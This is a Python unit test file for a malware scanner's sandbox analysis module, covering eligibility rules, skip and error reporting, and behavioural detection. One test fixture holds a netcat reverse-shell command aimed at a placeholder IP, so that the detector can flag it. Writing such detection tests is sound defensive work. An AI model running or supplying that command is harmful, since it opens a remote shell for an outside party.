"""M5 Dynamic Analysis unit tests (no Docker required for policy/behavioral)."""

from __future__ import annotations

import sys
from pathlib import Path
from unittest.mock import patch

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from app.analyzers.dynamic.analyzer import DynamicAnalyzer, _map_status  # noqa: E402
from app.analyzers.dynamic.behavioral import behavioral_findings  # noqa: E402
from app.analyzers.dynamic.manager import DynamicAnalysisManager, is_executable  # noqa: E402
from app.analyzers.dynamic.models import DynamicDecision  # noqa: E402
from app.analyzers.sandbox.runner import SandboxError  # noqa: E402
from app.core.config import settings  # noqa: E402

manager = DynamicAnalysisManager()


def test_eligibility_executable():
    assert manager.decide(head=b"#!/bin/sh\n", filename="x.sh", detected_type=None, size_bytes=100, m4_high_finding=False).decision == DynamicDecision.EXECUTED
    assert manager.decide(head=b"\x7fELF...", filename="x", detected_type=None, size_bytes=100, m4_high_finding=False).decision == DynamicDecision.EXECUTED
    assert manager.decide(head=b"MZ\x90\x00", filename="x.bin", detected_type=None, size_bytes=100, m4_high_finding=False).decision == DynamicDecision.EXECUTED
    assert manager.decide(head=b"print(1)", filename="x.py", detected_type=None, size_bytes=100, m4_high_finding=False).decision == DynamicDecision.EXECUTED
    print("[PASS] executable eligibility by nature")


def test_eligibility_suspicion_and_skip():
    d = manager.decide(head=b"%PDF", filename="x.pdf", detected_type="pdf", size_bytes=100, m4_high_finding=False)
    assert d.decision == DynamicDecision.NOT_ELIGIBLE and d.reason == "not_executable"
    d = manager.decide(head=b"%PDF", filename="x.pdf", detected_type="pdf", size_bytes=100, m4_high_finding=True)
    assert d.decision == DynamicDecision.EXECUTED and d.reason == "suspicion"
    d = manager.decide(head=b"#!/bin/sh\n", filename="x.sh", detected_type=None, size_bytes=manager.max_file_mb * 1024 * 1024 + 1, m4_high_finding=False)
    assert d.decision == DynamicDecision.SKIPPED_BY_POLICY and d.reason == "size_exceeded"
    with patch.object(settings, "dynamic_enabled", False):
        d = DynamicAnalysisManager().decide(head=b"#!/bin/sh\n", filename="x.sh", detected_type=None, size_bytes=10, m4_high_finding=False)
    assert d.decision == DynamicDecision.SKIPPED_BY_POLICY and d.reason == "disabled"
    assert is_executable(b"garbage", "report.pdf", "pdf") is False
    print("[PASS] suspicion eligibility + explicit skips")


def test_behavioral_findings():
    events = [
        {"kind": "process", "type": "process_created", "pid": "10", "name": "/bin/sh", "command_line": "/bin/sh", "argv": ["/bin/sh", "x.sh"]},
        {"kind": "process", "type": "process_created", "pid": "11", "name": "/bin/sh", "command_line": "/bin/sh", "argv": ["sh", "-c", "nc -e /bin/sh 1.2.3.4 4444"]},
        {"kind": "network", "type": "network_attempt", "pid": "11", "destination": "8.8.8.8", "port": 53, "blocked": True},
    ]
    findings = behavioral_findings(events, "sandbox", "0.4.0")
    types = [f.type for f in findings]
    assert "shell_execution" in types, types
    assert "suspicious_command" in types, types
    assert "dns_request" in types, types
    assert all(f.source == "sandbox" for f in findings)
    print("[PASS] behavioral findings (shell/suspicious/dns)")


def test_harness_not_flagged():
    events = [
        {"kind": "process", "type": "process_created", "pid": "10", "name": "/bin/sh", "command_line": "/bin/sh", "argv": ["/bin/sh", "benign.sh"]},
    ]
    assert behavioral_findings(events, "sandbox", "0.4.0") == []
    print("[PASS] harness process not flagged (benign stays clean)")


def test_skip_decision_payload():
    analyzer = DynamicAnalyzer()
    scan = type("Scan", (), {})()
    scan.id = None
    scan.file = type("File", (), {"sha256": "deadbeef", "filename": "plain.pdf", "detected_type": "pdf", "size_bytes": 10})()
    settings.uploads_dir.mkdir(parents=True, exist_ok=True)
    path = settings.uploads_dir / "deadbeef.bin"
    path.write_bytes(b"%PDF-1.4\n")
    try:
        with patch("app.analyzers.dynamic.analyzer.has_m4_high_finding", return_value=False):
            findings = analyzer.analyze(None, scan)
        assert len(findings) == 1 and findings[0].type == "sandbox_info", findings
        assert findings[0].evidence["decision"] == "not_eligible"
        assert analyzer.get_payload()["decision"] == "not_eligible"
        assert analyzer.get_payload()["reason"] == "not_executable"
    finally:
        path.unlink(missing_ok=True)
    print("[PASS] skip decision observable in finding + payload")


def test_sandbox_error_decision():
    analyzer = DynamicAnalyzer()
    scan = type("Scan", (), {})()
    scan.id = None
    scan.file = type("File", (), {"sha256": "beefdead", "filename": "x.sh", "detected_type": None, "size_bytes": 10})()
    path = settings.uploads_dir / "beefdead.bin"
    path.write_bytes(b"#!/bin/sh\n")
    try:
        with patch("app.analyzers.dynamic.analyzer.has_m4_high_finding", return_value=False), \
             patch("app.analyzers.dynamic.analyzer.SandboxRunner") as runner_cls:
            runner_cls.return_value.analyze_file.side_effect = SandboxError("docker down")
            findings = analyzer.analyze(None, scan)
        assert any(f.type == "sandbox_error" for f in findings), findings
        assert analyzer.get_payload()["decision"] == "sandbox_error"
    finally:
        path.unlink(missing_ok=True)
    print("[PASS] Docker/SandboxError -> explicit SANDBOX_ERROR")


def test_status_mapping_and_version():
    assert _map_status("timeout") == (DynamicDecision.TIMEOUT, "exec_timeout")
    assert _map_status("resource_limit")[0] == DynamicDecision.EXECUTION_ERROR
    assert _map_status("completed")[0] == DynamicDecision.EXECUTED
    assert settings.ANALYZER_VERSIONS["sandbox"] == "0.4.0"
    print("[PASS] status mapping + sandbox version 0.4.0")


print("M5 DYNAMIC UNIT TESTS PASSED: 7/7")
